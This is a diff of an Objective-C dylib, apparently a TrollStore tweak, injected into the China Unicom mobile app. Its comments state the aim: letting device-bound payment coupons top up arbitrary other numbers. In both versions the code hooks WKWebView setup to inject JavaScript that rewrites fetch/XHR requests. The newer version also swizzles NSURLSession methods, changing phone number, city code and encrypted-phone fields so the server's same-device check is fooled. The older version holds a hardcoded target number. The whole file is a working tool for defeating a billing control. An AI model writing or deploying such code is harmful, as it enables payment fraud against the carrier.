@@ -1,103 +1,215 @@
-//
-//  couponhook.m
-//  TrollStore dylib 注入中国联通 App (com.chinaunicom.mobilebusiness)
-//  作用: 让 "本机券" 能用于给任意联通号交费
-//  原理:
-//   1. hook WKWebView 初始化, 给交费页 H5 注入 JS
-//   2. 注入的 JS hook fetch/XHR, 把查券(getNineGrid)和下单校验(mobAppPayFeeCheck/Apply)
-//      请求里的 commonBean.phoneNo / commonBean.cityCode / custom.currentPhoneNumberAes
-//      改写成目标号, 使 服务端看到的 "本机号" == "充值号" == 目标号, 骗过本机校验
-//  零依赖: 只用 Objective-C runtime, 不需要 theos/CydiaSubstrate
-//
-#import <objc/runtime.h>
-#import <Foundation/Foundation.h>
-#import <WebKit/WebKit.h>
+// couponhook.m — TrollStore dylib
+// 让中国联通 App 的「本机交费券」给他人号码交费:
+//   1) hook 主进程 NSURLSession 原生请求, 改写 commonBean.phoneNo / cityCode / currentPhoneNumberAes
+//   2) hook WKWebViewConfiguration.init, 给所有 WebView 注入 JS, 改写 H5 层 fetch/XHR 参数
+// 全部走 objc runtime C API, 不依赖苹果 SDK; 符号由目标 App 运行时解析。
+#import "config_gen.h"
+#import "objc_runtime_min.h"
+#import "rt_bridge.h"
+#include <string.h>
+#include <stdlib.h>
 
-#pragma mark - 配置区 (默认常量, 可被 config_gen.h 覆盖) ----------------------
-// 想用本机券给哪个联通号交费 (CI / 本地 make 通过 TARGET_PHONE 覆盖, 不必改源码)
-// 目标号归属地城市码 (湖北=724, 天津=110, 北京=010 ... 按目标号实际归属地填)
-// 用 frida_locate.py 在真机拿到 encrypt(kTargetPhone) 的密文后, 通过 TARGET_PHONE_AES 传入
-// 没填密文(__FILL_FROM_FRIDA__)时: phoneNo/cityCode 仍会改写, 但 currentPhoneNumberAes 不动
-#include "config_gen.h"
-#ifndef TARGET_PHONE
-#define TARGET_PHONE @"15629799900"
-#endif
-#ifndef TARGET_CITY
-#define TARGET_CITY @"724"
-#endif
-#ifndef TARGET_PHONE_AES
-#define TARGET_PHONE_AES @"__FILL_FROM_FRIDA__"
-#endif
-static NSString *const kTargetPhone = TARGET_PHONE;
-static NSString *const kTargetCity  = TARGET_CITY;
-static NSString *const kTargetPhoneAes = TARGET_PHONE_AES;
-#pragma mark ----------------------------------------------------------------
+// ---------- 配置 (来自 config_gen.h, 由 Makefile/CI 注入) ----------
+static const char *g_target_phone = TARGET_PHONE_CSTR;
+static const char *g_target_city  = TARGET_CITY_CSTR;
+static const char *g_target_aes   = TARGET_PHONE_AES_CSTR;  // 可能为空字符串
 
-// 注入 WebView 的 JS: hook fetch / XMLHttpRequest, 改写查券与下单请求
-static NSString *InjectJS(void){
-    NSString *fmt =
-    @"(function(){"
-    "  var T='%@'; var C='%@'; var A='%@';"
-    "  function setP(u,k,v){try{var x=u.split('?');if(x.length<2)return u;"
-    "    var p=new URLSearchParams(x[1]); p.set(k,v); return x[0]+'?'+p.toString();}catch(e){return u;}}"
-    "  function rw(u){"
-    "    if(u.indexOf('getNineGrid.action')>-1){u=setP(u,'commonBean.phoneNo',T);u=setP(u,'commonBean.cityCode',C);}"
-    "    if(u.indexOf('mobAppPayFeeCheck')>-1||u.indexOf('mobAppPayFeeApply')>-1){"
-    "      u=setP(u,'commonBean.phoneNo',T);u=setP(u,'commonBean.cityCode',C);"
-    "      if(A.indexOf('__FILL')===-1){u=setP(u,'custom.currentPhoneNumberAes',A);}"
-    "    }"
-    "    return u;"
-    "  }"
-    "  var of=window.fetch;"
-    "  window.fetch=function(i,o){var u=(typeof i==='string')?i:(i&&i.url);"
-    "    if(u&&(u.indexOf('getNineGrid')>-1||u.indexOf('mobAppPayFeeCheck')>-1||u.indexOf('mobAppPayFeeApply')>-1)){"
-    "      var n=rw(u); if(typeof i==='string')i=n; else if(i&&i.url)Object.defineProperty(i,'url',{value:n,configurable:true});}"
-    "    return of.apply(this,arguments);};"
-    "  var oo=XMLHttpRequest.prototype.open;"
-    "  XMLHttpRequest.prototype.open=function(m,u){"
-    "    if(u&&(u.indexOf('getNineGrid')>-1||u.indexOf('mobAppPayFeeCheck')>-1||u.indexOf('mobAppPayFeeApply')>-1)){u=rw(u);}"
-    "    return oo.call(this,m,u);};"
-    "  console.log('[coupon_hook] target='+T);"
-    "})();";
-    return [NSString stringWithFormat:fmt, kTargetPhone, kTargetCity, kTargetPhoneAes];
+// ---------- 注入到 WebView 的 JS ----------
+// 改写页面里所有出去的请求的 phoneNo / cityCode / currentPhoneNumberAes 字段
+static const char *INJECT_JS =
+"(function(){"
+"var TP='" TARGET_PHONE_CSTR "',TC='" TARGET_CITY_CSTR "',TA='" TARGET_PHONE_AES_CSTR "';"
+"function rw(q){if(!q)return q;"
+"q=q.replace(/(commonBean\\.phoneNo)=[^&]*/g,'$1='+TP);"
+"q=q.replace(/(commonBean\\.cityCode)=[^&]*/g,'$1='+TC);"
+"if(TA&&TA.length)q=q.replace(/(currentPhoneNumberAes)=[^&]*/g,'$1='+TA);"
+"q=q.replace(/(phoneNo)=[^&]*/g,'$1='+TP);"
+"q=q.replace(/\"commonBean\\.phoneNo\"\\s*:\\s*\"[^\"]*\"/g,'\"commonBean.phoneNo\":\"'+TP+'\"');"
+"q=q.replace(/\"commonBean\\.cityCode\"\\s*:\\s*\"[^\"]*\"/g,'\"commonBean.cityCode\":\"'+TC+'\"');"
+"return q;}"
+"var O=XMLHttpRequest.prototype.open;"
+"XMLHttpRequest.prototype.open=function(m,u){u=rw(u);return O.apply(this,arguments);};"
+"var S=XMLHttpRequest.prototype.send;"
+"XMLHttpRequest.prototype.send=function(d){if(typeof d==='string')d=rw(d);return S.apply(this,arguments);};"
+"var F=window.fetch;"
+"window.fetch=function(u,i){if(typeof u==='string')u=rw(u);if(i&&typeof i.body==='string')i=Object.assign({},i,{body:rw(i.body)});return F(u,i);};"
+"})();";
+
+// ---------- 工具 ----------
+static int is_unicom_host(id req) {
+    id url = rt_request_url(req);
+    if (!url) return 0;
+    const char *s = rt_cstr(objc_msgSend(url, sel_registerName("absoluteString")));
+    if (!s) return 0;
+    if (strstr(s, "unicom") || strstr(s, "10010") || strstr(s, "wo.com") ||
+        strstr(s, "npfwap") || strstr(s, "chinaunicom")) return 1;
+    return 0;
 }
 
-static NSMutableSet *g_injected = nil;
-
-static void AddScriptToConfig(WKWebViewConfiguration *cfg){
-    if(!cfg) return;
-    if(!g_injected) g_injected = [NSMutableSet new];
-    @synchronized(g_injected){
-        if([g_injected containsObject:@((uintptr_t)cfg)]) return;
-        [g_injected addObject:@((uintptr_t)cfg)];
+// form 字符串: 把 key=value 中的 value 替换为 val (匹配 &key= 或 行首key=)
+static void form_replace_all(char *out, size_t outsz, const char *body, const char *key, const char *val) {
+    if (!out || outsz == 0) return;
+    out[0] = '\0';
+    if (!body || !key || !val) return;
+    size_t klen = strlen(key);
+    size_t blen = strlen(body);
+    const char *p = body;
+    while (p < body + blen) {
+        const char *found = strstr(p, key);
+        if (!found) { strncat(out, p, outsz - strlen(out) - 1); break; }
+        int ok_pre = (found == body) || (*(found - 1) == '&');
+        int ok_suf = (found + klen < body + blen) && (*(found + klen) == '=');
+        if (ok_pre && ok_suf) {
+            size_t before = (size_t)(found - p);
+            strncat(out, p, before);
+            strncat(out, key, outsz - strlen(out) - 1);
+            strncat(out, "=", outsz - strlen(out) - 1);
+            strncat(out, val, outsz - strlen(out) - 1);
+            const char *v = found + klen + 1;
+            const char *amp = strchr(v, '&');
+            p = amp ? amp : (body + blen);
+        } else {
+            char t[2] = {*p, 0};
+            strncat(out, t, outsz - strlen(out) - 1);
+            p++;
+        }
     }
-    NSString *js = InjectJS();
-    Class usCls = NSClassFromString(@"WKUserScript");
-    if(!usCls || !js) return;
-    // AtDocumentStart: 在页面 JS 执行前就 hook 掉 fetch/XHR
-    id script = [[usCls alloc] initWithSource:js
-                               injectionTime:WKUserScriptInjectionTimeAtDocumentStart
-                            forMainFrameOnly:NO];
-    [[cfg userContentController] addUserScript:script];
 }
 
-__attribute__((constructor)) static void TweakInit(void){
-    // 延迟到 App 主线程起来后再 hook, 避免早期初始化竞争
-    dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(1.5 * NSEC_PER_SEC)),
-                   dispatch_get_main_queue(), ^{
-        Class cls = objc_getClass("WKWebView");
-        if(!cls) return;
-        SEL sel = @selector(initWithFrame:configuration:);
-        Method m = class_getInstanceMethod(cls, sel);
-        if(!m) return;
-        typedef WKWebView *(*orig_t)(id, SEL, CGRect, WKWebViewConfiguration *);
-        orig_t orig = (orig_t)method_getImplementation(m);
-        method_setImplementation(m, imp_implementationWithBlock(
-            ^(id self, CGRect frame, WKWebViewConfiguration *cfg){
-                WKWebView *wv = orig(self, sel, frame, cfg);
-                // WKWebView 内部会持有 configuration 的 copy, 直接对返回对象的 configuration 加脚本最稳
-                if(wv) AddScriptToConfig([wv configuration]);
-                return wv;
-            }));
-    });
+// JSON 字符串: 替换 "key" : "value" 中的 value
+static void json_replace_key(char *out, size_t outsz, const char *body, const char *key, const char *val) {
+    if (!out || outsz == 0) { return; }
+    out[0] = '\0';
+    if (!body || !key || !val) return;
+    char pat[256];
+    snprintf(pat, sizeof(pat), "\"%s\"", key);
+    size_t plen = strlen(pat);
+    size_t blen = strlen(body);
+    const char *p = body;
+    while (p < body + blen) {
+        const char *found = strstr(p, pat);
+        if (!found) { strncat(out, p, outsz - strlen(out) - 1); break; }
+        const char *colon = strchr(found + plen, ':');
+        if (!colon) { strncat(out, p, 1); p++; continue; }
+        const char *q = colon + 1;
+        while (*q == ' ' || *q == '\t' || *q == '\n' || *q == '\r') q++;
+        if (*q != '"') { strncat(out, p, 1); p++; continue; }
+        const char *vstart = q + 1;
+        const char *vend = strchr(vstart, '"');
+        if (!vend) { strncat(out, p, 1); p++; continue; }
+        size_t before = (size_t)(vstart - p);
+        strncat(out, p, before);
+        strncat(out, "\"", outsz - strlen(out) - 1);
+        strncat(out, val, outsz - strlen(out) - 1);
+        strncat(out, "\"", outsz - strlen(out) - 1);
+        p = vend + 1;
+    }
+}
+
+// 改写请求体 (form 或 JSON), 返回新 request (mutable). 非联通请求返回原 request.
+static id rewrite_request(id request) {
+    if (!is_unicom_host(request)) return request;
+    id mreq = rt_request_mutable(request);
+    if (!mreq) return request;
+    id bodyStr = rt_request_httpbody_str(mreq);
+    const char *body = rt_cstr(bodyStr);
+    if (body && *body) {
+        size_t cap = strlen(body) * 3 + 1024;
+        char *b1 = (char *)malloc(cap);
+        char *b2 = (char *)malloc(cap);
+        if (b1 && b2) {
+            char *cur = b1, *nxt = b2;
+            strncpy(cur, body, cap - 1); cur[cap - 1] = '\0';
+            if (body[0] == '{') {
+                #define CHAIN_JSON(K,V) do { json_replace_key(nxt,cap,cur,K,V); char *_t=cur;cur=nxt;nxt=_t; } while(0)
+                CHAIN_JSON("commonBean.phoneNo", g_target_phone);
+                CHAIN_JSON("commonBean.cityCode", g_target_city);
+                if (g_target_aes && g_target_aes[0]) CHAIN_JSON("currentPhoneNumberAes", g_target_aes);
+                CHAIN_JSON("phoneNo", g_target_phone);
+                #undef CHAIN_JSON
+            } else {
+                #define CHAIN_FORM(K,V) do { form_replace_all(nxt,cap,cur,K,V); char *_t=cur;cur=nxt;nxt=_t; } while(0)
+                CHAIN_FORM("commonBean.phoneNo", g_target_phone);
+                CHAIN_FORM("commonBean.cityCode", g_target_city);
+                if (g_target_aes && g_target_aes[0]) CHAIN_FORM("currentPhoneNumberAes", g_target_aes);
+                CHAIN_FORM("phoneNo", g_target_phone);
+                #undef CHAIN_FORM
+            }
+            rt_request_set_httpbody_str(mreq, cur);
+            free(b1); free(b2);
+        }
+    }
+    rt_log("couponhook: request rewritten");
+    return mreq;
+}
+
+// ---------- NSURLSession hook ----------
+static IMP g_orig_dataTask_ch = NULL;
+static IMP g_orig_dataTask = NULL;
+static IMP g_orig_upload_ch = NULL;
+static IMP g_orig_upload = NULL;
+static IMP g_orig_upload_file_ch = NULL;
+
+static id hook_dataTask_ch(id self, SEL _cmd, id request, id handler) {
+    id nr = rewrite_request(request);
+    return ((id(*)(id, SEL, id, id))g_orig_dataTask_ch)(self, _cmd, nr, handler);
+}
+static id hook_dataTask(id self, SEL _cmd, id request) {
+    id nr = rewrite_request(request);
+    return ((id(*)(id, SEL, id))g_orig_dataTask)(self, _cmd, nr);
+}
+static id hook_upload_ch(id self, SEL _cmd, id request, id body, id handler) {
+    id nr = rewrite_request(request);
+    return ((id(*)(id, SEL, id, id, id))g_orig_upload_ch)(self, _cmd, nr, body, handler);
+}
+static id hook_upload(id self, SEL _cmd, id request, id body) {
+    id nr = rewrite_request(request);
+    return ((id(*)(id, SEL, id, id))g_orig_upload)(self, _cmd, nr, body);
+}
+static id hook_upload_file_ch(id self, SEL _cmd, id request, id fileURL, id handler) {
+    id nr = rewrite_request(request);
+    return ((id(*)(id, SEL, id, id, id))g_orig_upload_file_ch)(self, _cmd, nr, fileURL, handler);
+}
+
+// ---------- WKWebViewConfiguration hook (注入 JS) ----------
+static IMP g_orig_cfg_init = NULL;
+static id my_cfg_init(id self, SEL _cmd) {
+    id cfg = ((id(*)(id, SEL))g_orig_cfg_init)(self, _cmd);
+    if (!cfg) return cfg;
+    id ucc = objc_msgSend(cfg, sel_registerName("userContentController"));
+    if (!ucc) return cfg;
+    Class WKUserScript = (Class)objc_getClass("WKUserScript");
+    if (!WKUserScript) return cfg;
+    id script = objc_msgSend((id)WKUserScript, sel_registerName("alloc"));
+    // initWithSource:injectionTime:forMainFrameOnly:  (0=AtDocumentStart, NO=all frames)
+    script = objc_msgSend(script, sel_registerName("initWithSource:injectionTime:forMainFrameOnly:"),
+                          rt_str(INJECT_JS), (int)0, (BOOL)0);
+    objc_msgSend(ucc, sel_registerName("addUserScript:"), script);
+    return cfg;
+}
+
+static void hook_instance(Class cls, const char *selname, IMP newimp, IMP *orig_slot) {
+    if (!cls) return;
+    SEL sel = sel_registerName(selname);
+    Method m = class_getInstanceMethod(cls, sel);
+    if (!m) { rt_log("couponhook: method not found"); return; }
+    *orig_slot = method_getImplementation(m);
+    method_setImplementation(m, newimp);
+}
+
+__attribute__((constructor))
+static void tweak_init(void) {
+    rt_log("couponhook: loaded");
+    Class NSURLSessionCls = (Class)objc_getClass("NSURLSession");
+    if (NSURLSessionCls) {
+        hook_instance(NSURLSessionCls, "dataTaskWithRequest:completionHandler:", (IMP)hook_dataTask_ch, &g_orig_dataTask_ch);
+        hook_instance(NSURLSessionCls, "dataTaskWithRequest:", (IMP)hook_dataTask, &g_orig_dataTask);
+        hook_instance(NSURLSessionCls, "uploadTaskWithRequest:fromData:completionHandler:", (IMP)hook_upload_ch, &g_orig_upload_ch);
+        hook_instance(NSURLSessionCls, "uploadTaskWithRequest:fromData:", (IMP)hook_upload, &g_orig_upload);
+        hook_instance(NSURLSessionCls, "uploadTaskWithRequest:fromFile:completionHandler:", (IMP)hook_upload_file_ch, &g_orig_upload_file_ch);
+    }
+    Class WKConfigCls = (Class)objc_getClass("WKWebViewConfiguration");
+    if (WKConfigCls) {
+        hook_instance(WKConfigCls, "init", (IMP)my_cfg_init, &g_orig_cfg_init);
+    }
 }
